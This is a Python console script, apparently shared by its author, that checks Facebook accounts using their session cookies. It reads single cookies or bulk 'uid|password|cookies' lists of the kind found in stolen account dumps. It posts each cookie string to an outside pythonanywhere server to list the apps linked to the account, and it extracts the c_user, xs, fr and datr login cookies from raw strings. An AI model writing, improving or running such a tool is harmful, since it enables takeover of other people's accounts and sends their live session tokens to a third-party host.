#=======Made by Reborn==========
import requests, os
import random, re
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()

class FacebookAppChecker:
    # Colors
    r = '\x1b[1;31m'
    g = '\x1b[1;32m'
    y = '\x1b[1;33m'
    b = '\x1b[1;34m'
    c = '\x1b[1;36m'
    w = '\x1b[1;37m'

    def __init__(self):
        os.system("cls" if os.name == "nt" else "clear")
        self.logo()
        
        print(f"{self.b}={self.w}" * 56)
        print(f"        {self.g}[//] FacebookAppChecker By Dipak [//]{self.w}")
        print(f"{self.b}={self.w}" * 56)
        print(f"[1] SINGLE COOKIES")
        print(f"[2] COOKIES FILE")
        print(f"[3] COOKIE GENERATOR")
        print(f"{self.b}={self.w}" * 56)
        
        choice = input(f"{self.y}[//] Select Option : {self.w}")
        print(f"{self.b}={self.w}" * 56)

        if choice == '1':
            self.process_manual_input()
        elif choice == '2':
            filename = input(f"{self.y}[//] Enter filename: {self.w}")
            self.process_file_input(filename)
        elif choice == '3':
            raw_cookie = input(f"{self.y}[//] Enter FB cookie 🍪: {self.w}")
            cleaned = self.extract_fb_cookies(raw_cookie)
            if cleaned:
                console.print("\n[bold green]✅ Extracted login cookies:[/bold green]")
                print(f"{self.b}={self.w}" * 56)
                console.print(f"[green]{cleaned}[/green]")
                print(f"{self.b}={self.w}" * 56)
            else:
                console.print("[bold red]⚠️ No valid Facebook cookies found![/bold red]")
        else:
            print(f"{self.r}[//] Invalid choice{self.w}")
            

    # ------------[ LOGO + STATUS ]-------------- #
    def logo(self):
        run_count = 0
        status_list = ['Online', 'Active', 'Busy', 'Away', 'Do Not Disturb']
        random_status = random.choice(status_list)
        
        logo = f"""
[green1]   _____      _                       
  |  __ \\    | |                      
  | |__) |___| |__   ___  _ __ _ __   
  |  _  // _ \\ '_ \\ / _ \\| '__| '_ \\  
  | | \\ \\  __/ |_) | (_) | |  | | | | 
  |_|  \\_\\___|_.__/ \\___/|_|  |_| |_|   [yellow]XD[/yellow][/green1]
"""
        info = f"""
[bold white][+] Owner       [bold red]● Dipak[/bold red]
[bold white][+] Facebook    [bold red]● Reborn Bëb[/bold red]
[bold white][+] Status      [bold red]● {random_status}[/bold red]
[bold white][+] Github      [bold red]● FB cheaker [/bold red]
[bold white][+] Version     [bold red]● 0.1[/bold red]
[bold white][+] Run Count   [bold red]● {run_count}[/bold red]
"""
        console.print(logo)
        console.print(Panel(info, title="[bold magenta] INFO [/bold magenta]", box=box.DOUBLE, border_style="bright_magenta"))

    # Function to get apps data from server
    def show_apps(self, cookies):
        try:
            response = requests.post(
                'https://shajon404.pythonanywhere.com/facebook_apps',
                json={"cookies": cookies},
                timeout=10
            )
            data = response.json()
            return data
        except Exception:
            return None  # return None for invalid cookies or request failure

    # Function to display apps nicely
    def display_apps(self, data):
        # If cookies are invalid, skip entirely
        if not data or 'all_apps' not in data:
            print(f"{self.r}[//] Cannot login with provided cookies. Skipping...{self.w}")
            print(f"{self.b}-{self.w}" * 56)
            return

        active = data['all_apps'].get('active_apps', {})
        inactive = data['all_apps'].get('inactive_apps', {})

        print(f"{self.b}-{self.w}" * 56)

        # Active apps
        if active:
            print(f"{self.g}[//] ACTIVE APPS █{self.w}")
            print(f"{self.b}-{self.w}" * 56)
            for app, date in active.items():
                print(f"{self.g}[//] {app} => {date}{self.w}")
        else:
            print(f"{self.r}[//] No active apps found{self.w}")
        print(f"{self.b}-{self.w}" * 56)

        # Inactive apps
        if inactive:
            print(f"{self.c}[//] INACTIVE APPS █{self.w}")
            print(f"{self.b}-{self.w}" * 56)
            for app, date in inactive.items():
                print(f"{self.c}[//] {app} => {date}{self.w}")
        else:
            print(f"{self.r}[//] No inactive apps found{self.w}")
        print(f"{self.b}-{self.w}" * 56)

    # Function to process manual input
    def process_manual_input(self):
        cookies = input(f"[//] COOKIES : {self.g}")
        data = self.show_apps(cookies)
        self.display_apps(data)

    # Function to process file input
    def process_file_input(self, filename):
        try:
            with open(filename, 'r') as f:
                lines = f.readlines()
            for line in lines:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                uid, password, cookies = line.split('|')
                print(f"{self.y}[//] Checking UID : {self.g}{uid}{self.w}")  
                data = self.show_apps(cookies)
                self.display_apps(data)
        except FileNotFoundError:
            print(f"{self.r}[//] File not found: {filename}{self.w}")
        except Exception as e:
            print(f"{self.r}[//] Error: {e}{self.w}")
            
    # Extract FB cookies
    def extract_fb_cookies(self, raw_cookie):
        keys = ["c_user", "xs", "fr", "datr"]
        cookies = {}
        for key in keys:
            match = re.search(rf"{key}=([^;]+)", raw_cookie)
            if match:
                cookies[key] = match.group(1)
        cookie_str = ";".join(f"{k}={v}" for k, v in cookies.items())  # no space after ;
        return cookie_str
        os.system('python reborn .py')


if __name__ == "__main__":
    FacebookAppChecker()
